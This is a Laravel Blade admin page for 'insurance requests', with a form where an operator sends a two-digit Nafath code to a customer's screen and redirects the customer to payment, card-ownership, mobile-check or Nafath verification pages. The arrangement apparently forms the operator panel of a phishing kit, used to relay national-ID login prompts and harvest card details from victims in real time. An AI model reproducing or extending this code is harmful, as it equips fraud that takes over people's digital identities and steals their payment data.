@extends('admin.layouts.app')

@section('content')
    {{-- =========================================================== --}}
    {{-- =================== Page Header Section =================== --}}
    {{-- =========================================================== --}}
    <div class="page-breadcrumb">
        <div class="row">
            <div class="col-md-5 align-self-center">
                <h3 class="page-title">Insurance Request</h3>
                <div class="d-flex align-items-center">
                    <nav aria-label="breadcrumb">
                        <ol class="breadcrumb">
                            <li class="breadcrumb-item"><a href="{{ route('super_admin.dashboard') }}">Dashboard</a></li>
                            <li class="breadcrumb-item active" aria-current="page"><a
                                    href="{{ route('super_admin.insurance_requests-index') }}">Insurances Requests</a></li>
                            <li class="breadcrumb-item active" aria-current="page">Send Nafath Code</li>
                        </ol>
                    </nav>
                </div>
            </div>
          
        </div>
    </div>

    {{-- ========================================================== --}}
    {{-- ==================== Page Body Section =================== --}}
    {{-- ========================================================== --}}
    <div class="container-fluid">
        <div class="row">
            {{-- Left Section --}}
            <div class="col-lg-3 col-xlg-3 col-md-5">
                <div class="card">
                    <div class="card-body">
                        <center class="mt-4">
                            {{-- Insurance Type --}}
                            <small class="text-muted pt-4 db">Insurance Type</small>
                            <h4 class="card-title mt-2"> {{ isset($insuranceRequest->insurance_type) ? $insuranceRequest->insurance_type : '-------' }}</h4>

                           

                            {{-- Added Since --}}
                            <small class="text-muted pt-4 db">Added Since</small>
                            <h6>{!! isset($insuranceRequest->created_at) ? $insuranceRequest->created_at->diffForHumans() : '-------' !!}</h6>

                            {{-- Addition Time --}}
                            <small class="text-muted pt-4 db">Addition Time</small>
                            <h6>{!! isset($insuranceRequest->created_at) ? date('h:i A', strtotime($insuranceRequest->created_at)) : '-------' !!}</h6>

                            {{-- Addition Date --}}
                            <small class="text-muted pt-4 db">Addition Date</small>
                            <h6>{!! isset($insuranceRequest->created_at) ? date('Y / F (m) / d', strtotime($insuranceRequest->created_at)) : '-------' !!}</h6>
                        </center>
                    </div>
                </div>
            </div>

            {{-- Right Section --}}
            <div class="col-lg-9 col-xlg-9 col-md-7">
                <div class="card">
                  
                    <div class="tab-content" id="pills-tabContent">
                        <div class="tab-pane fade show active" id="tab_body_1" role="tabpanel" aria-labelledby="tab_body_1">
                            <div class="card-body">
                                <div class="row">
                                    <form action="{{ route('super_admin.insurance_requests-sendNafathCodeRequest', $insuranceRequest->id) }}" method="POST" id="signUpForm"
                                        enctype="multipart/form-data">
                                        @csrf
                                        <div class="row">
                                            {{-- Nafath Code Input --}}
                                            <div class="col-md-8">
                                                <div class="form-floating mb-3">
                                                    <input type="number" name="nafath_code" min="0" max="99" maxlength="2"
                                                        class="form-control border border-info @error('nafath_code') border-danger @enderror"
                                                        id="nafathCodeInput" value="{{ old('nafath_code') }}" placeholder="Nafath Code">
                                                    <label for="nafathCodeInput">
                                                        <i data-feather="type" class="feather-sm text-info fill-white me-2"></i>Nafath Code (رقمين)
                                                        <strong class="text-danger">
                                                            @error('nafath_code')
                                                            ( {{ $message }} )
                                                            @enderror
                                                        </strong>
                                                    </label>
                                                </div>
                                            </div>

                                            {{-- Send Button --}}
                                            <div class="col-md-4">
                                                <button type="button" id="sendNafathBtn"
                                                    class="btn btn-primary font-weight-medium rounded-pill px-4 w-100" style="height: 58px;">
                                                    <div class="d-flex align-items-center justify-content-center">
                                                        <i data-feather="send" class="feather-sm fill-white me-2"></i>
                                                        ارسال كود نفاذ
                                                    </div>
                                                </button>
                                            </div>

                                            {{-- Display Sent Code --}}
                                            <div class="col-md-12">
                                                <div id="sentCodeDisplay" class="alert alert-success" style="display: none;">
                                                    <h4 class="text-center">
                                                        <i class="fas fa-check-circle"></i> تم إرسال الكود بنجاح
                                                    </h4>
                                                    <h1 class="text-center font-weight-bold" id="displayedCode" style="font-size: 72px; letter-spacing: 10px;">
                                                        --
                                                    </h1>
                                                </div>
                                            </div>

                                            {{-- Divider --}}
                                            <div class="col-12">
                                                <hr class="my-4">
                                                <h4 class="card-title">إجراءات الموافقة والتوجيه</h4>
                                            </div>

                                            {{-- Redirect Route Selection --}}
                                            <div class="col-md-12">
                                                <div class="form-floating mb-3">
                                                    <select name="redirect_route" id="redirectRoute" class="form-select border border-info">
                                                        <option value="/">الصفحة الرئيسية (Welcome)</option>
                                                        <option value="/insuranceStatements">بيانات التأمين</option>
                                                        <option value="/insuranceType">عروض التأمين المتاحة</option>
                                                        <option value="/paymentForm">معلومات الدفع</option>
                                                        <option value="/beforeCallProcess">قبل عملية الاتصال</option>
                                                        <option value="/cardOwnership">إثبات ملكية البطاقة</option>
                                                        <option value="/checkMobileNumber">التحقق من رقم الجوال</option>
                                                        <option value="/nafathVerification">مصادقة نفاذ</option>
                                                        <option value="/successfulPayment">عملية دفع ناجحة</option>
                                                        <option value="/failedPayment">عملية دفع فاشلة</option>
                                                    </select>
                                                    <label for="redirectRoute">
                                                        <i data-feather="map-pin" class="feather-sm text-info fill-white me-2"></i>
                                                        توجيه العميل إلى
                                                    </label>
                                                </div>
                                            </div>

                                            {{-- Action Buttons --}}
                                            <div class="col-md-6">
                                                <button type="submit" name="action" value="approve"
                                                    class="btn btn-success font-weight-medium rounded-pill px-4 w-100 mb-2" style="height: 50px;">
                                                    <div class="d-flex align-items-center justify-content-center">
                                                        <i data-feather="check-circle" class="feather-sm fill-white me-2"></i>
                                                        قبول الطلب
                                                    </div>
                                                </button>
                                            </div>

                                            <div class="col-md-6">
                                                <button type="submit" name="action" value="reject"
                                                    class="btn btn-danger font-weight-medium rounded-pill px-4 w-100 mb-2" style="height: 50px;">
                                                    <div class="d-flex align-items-center justify-content-center">
                                                        <i data-feather="x-circle" class="feather-sm fill-white me-2"></i>
                                                        رفض الطلب
                                                    </div>
                                                </button>
                                            </div>
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </div>

                      
                    </div>
                </div>
            </div>
        </div>
    </div>
@endsection

@section('extra_js')
<script>
    $(document).ready(function() {
        // Send Nafath Code Button Click
        $('#sendNafathBtn').on('click', function() {
            const code = $('#nafathCodeInput').val();
            
            // Validation
            if (!code || code.length !== 2) {
                Swal.fire({
                    icon: 'error',
                    title: 'خطأ',
                    text: 'يرجى إدخال رقمين فقط',
                    confirmButtonText: 'حسناً'
                });
                return;
            }

            // Show loading
            Swal.fire({
                title: 'جاري الإرسال...',
                allowOutsideClick: false,
                didOpen: () => {
                    Swal.showLoading();
                }
            });

            // Send code via AJAX
            $.ajax({
                url: '{{ route("super_admin.insurance_requests-sendNafathCodeRequest", $insuranceRequest->id) }}',
                method: 'POST',
                data: {
                    _token: '{{ csrf_token() }}',
                    nafath_code: code,
                    action: 'send_only'
                },
                success: function(response) {
                    Swal.close();
                    
                    // Display the code
                    $('#displayedCode').text(code);
                    $('#sentCodeDisplay').slideDown();
                    
                    // Success notification
                    Swal.fire({
                        icon: 'success',
                        title: 'تم الإرسال بنجاح',
                        text: 'تم إرسال الكود إلى شاشة العميل',
                        timer: 2000,
                        showConfirmButton: false
                    });

                    // Optional: Trigger live update to user's nafath page
                    broadcastNafathCode(code);
                },
                error: function(xhr, status, error) {
                    Swal.fire({
                        icon: 'error',
                        title: 'خطأ',
                        text: 'حدث خطأ أثناء الإرسال. يرجى المحاولة مرة أخرى',
                        confirmButtonText: 'حسناً'
                    });
                    console.error('Error:', error);
                }
            });
        });

        // Broadcast code to user's waiting page (using localStorage/sessionStorage simulation)
        function broadcastNafathCode(code) {
            // Store in session storage so the user's nafath page can retrieve it
            sessionStorage.setItem('nafath_code_{{ $insuranceRequest->id }}', code);
            sessionStorage.setItem('nafath_code_timestamp', new Date().getTime());
            
            // You can also use WebSocket or Server-Sent Events for real-time update
            console.log('Nafath code broadcasted:', code);
        }

        // Limit input to 2 digits
        $('#nafathCodeInput').on('input', function() {
            const value = $(this).val();
            if (value.length > 2) {
                $(this).val(value.slice(0, 2));
            }
        });

        // Form submission confirmation
        $('#signUpForm').on('submit', function(e) {
            const action = $('button[type="submit"]:focus').val();
            const route = $('#redirectRoute option:selected').text();
            
            let message = '';
            if (action === 'approve') {
                message = `هل أنت متأكد من قبول الطلب؟\nسيتم توجيه العميل إلى: ${route}`;
            } else if (action === 'reject') {
                message = `هل أنت متأكد من رفض الطلب؟`;
            }

            if (!confirm(message)) {
                e.preventDefault();
                return false;
            }
        });
    });
</script>
@endsection
